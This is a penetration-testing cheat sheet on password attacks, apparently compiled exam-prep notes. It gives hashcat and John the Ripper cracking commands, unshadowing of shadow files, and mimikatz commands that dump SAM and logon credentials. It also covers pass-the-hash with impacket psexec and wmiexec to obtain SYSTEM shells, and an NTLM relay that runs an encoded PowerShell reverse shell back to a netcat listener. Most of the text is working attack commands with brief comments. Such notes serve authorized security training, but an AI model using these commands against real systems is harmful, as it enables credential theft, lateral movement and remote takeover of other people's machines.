## Cracking Passwords

> Source: `01101100-C0D3X-00110110.md` → `Password Attacks > Cracking Passwords`

```
# Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output.
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show

# Runs John in conjunction with a wordlist to crack a pdf hash.
john --wordlist=rockyou.txt pdf.hash

# Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking.
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

# Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked.
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

# Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.
office2john.py Protected.docx > protected-docx.hash
```


## Cracking Hashes

> Source: `01101100-C0D3X-00110110.md` → `Exploitation > Password Attacks > Cracking Hashes`

Use tools like `hash-identifier` or `hashid` to identify hash types.

Consider using `bestrule64.rule` AND `rockyou-30000.rule` (located in `/usr/share/hashcat/rules/`).


## Wordlist Manipulation

> Source: `01101100-C0D3X-00110110.md` → `Exploitation > Password Attacks > Cracking Hashes > Wordlist Manipulation`

- Cut wordlist to 6-12 characters:
```bash
sed '/^.{6,12}$/!d' /usr/share/wordlists/rockyou.txt > rockyou-6to12.txt
```
- Cut down wordlist to 10,000 lines:
```bash
sed -n '1,10000p' /usr/share/wordlists/rockyou.txt > rockyou-10000.txt
```


## Hashcat

> Source: `01101100-C0D3X-00110110.md` → `Exploitation > Password Attacks > Cracking Hashes > Hashcat`

```bash
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
```

> **Troubleshooting SSH Key Issues:**

```bash
ssh-keygen -f "/root/.ssh/known_hosts" -R "[192.168.217.201]:2222"
```

Then try connecting again:

```bash
ssh -i /root/Downloads/id_rsa -p 2222 dave@192.168.217.201

id_ecdsa

id_dsa
```


## John the Ripper (JtR)

> Source: `01101100-C0D3X-00110110.md` → `Exploitation > Password Attacks > Cracking Hashes > John the Ripper (JtR)`

```bash
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

```bash
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
```


## Hashcat Examples

> Source: `01101100-C0D3X-00110110.md` → `Exploitation > Password Attacks > Cracking Hashes > Hashcat Examples`

```bash
hashcat -m 26900 --example-hashes
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```
> Add `--show` to display cracked hashes and passwords.
> The `rockyou2021` password list is massive (around a trillion passwords, 91GB!).


## One Rule Attack (Hashcat)

> Source: `01101100-C0D3X-00110110.md` → `Exploitation > Password Attacks > Cracking Hashes > One Rule Attack (Hashcat)`

```bash
hashcat -r OneRule ...
```

> The `-r OneRule` option mutates the password list. Use with `rockyou` or `rockyou2021`.


## NTLM Cracking

> Source: `01101100-C0D3X-00110110.md` → `Exploitation > Password Attacks > Cracking Hashes > NTLM Cracking`

```PowerShell
Get-LocalUser # (Windows)
```

```plaintext
.\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
sekurlsa:logonpasswords
```

```bash
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```


## Passing the Hash (NTLM)

> Source: `01101100-C0D3X-00110110.md` → `Exploitation > Password Attacks > Cracking Hashes > Passing the Hash (NTLM)`

Use tools like `smbclient`, `impacket-*`, `cme/nxc`, `psexec`, `wmiexec`, `rdp`, `winrm`.

```bash
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```

```bash
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

> `psexec` often gives a SYSTEM-level shell.

```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

> `wmiexec` often gives a user-level shell.


## Passing the Hash (NTLMv2)

> Source: `01101100-C0D3X-00110110.md` → `Exploitation > Password Attacks > Cracking Hashes > Passing the Hash (NTLMv2)`

**SMB Relay (Example using Impacket's `ntlmrelayx`)**

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```
> Encode the PowerShell reverse shell one-liner with UTF-16LE and then base64, and insert it into the command above.

**Steps for SMB Relay:**

1. Start a Netcat listener:
```bash
nc -lnvp <port1>
```

2. Call the SMB share created by `ntlmrelayx` from the target (RHOST):
```bash
nc <IP> <port2>
```
> An example of this could also be a WordPress plugin backup directory can be modified and when you specify `\\<Kali_IP\test` it will authenticate to us after you save the setting.

3. Verify access:
```bash
dir \\\\<LHOST>\\test
```


## Mutating Passwords (Hashcat Rules)

> Source: `01101100-C0D3X-00110110.md` → `Exploitation > Password Attacks > Database Files > Mutating Passwords (Hashcat Rules)`

- `$`: Appends characters.
- `^`: Prepends characters.
- `c`: Capitalizes the first letter.
- [More rules](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
> Rules are applied from left to right.

```bash
echo \$1 > demo.rule
hashcat -r demo.rule --stdout passwords.txt
ls -la /usr/share/hashcat/rules/
```


## Hashcat SPN (`$krb5tgs$23$*user$realm$test/spn*$633...`)

> Source: `01101100-C0D3X-00110110.md` → `Hashcat > Hashcat SPN (`$krb5tgs$23$*user$realm$test/spn*$633...`)`

```
hashcat -m 13100 --force -a 0 <hashfile> /usr/share/wordlists/rockyou.txt
```


## Hashcat Cracking mscash (e.g. $DCC2$10240#spot#3407..)

> Source: `01101100-C0D3X-00110110.md` → `Hashcat > Hashcat Cracking mscash (e.g. $DCC2$10240#spot#3407..)`

```
hashcat -m2100 '<mscash>' /usr/share/wordlists/rockyou.txt --force --potfile-disable
```
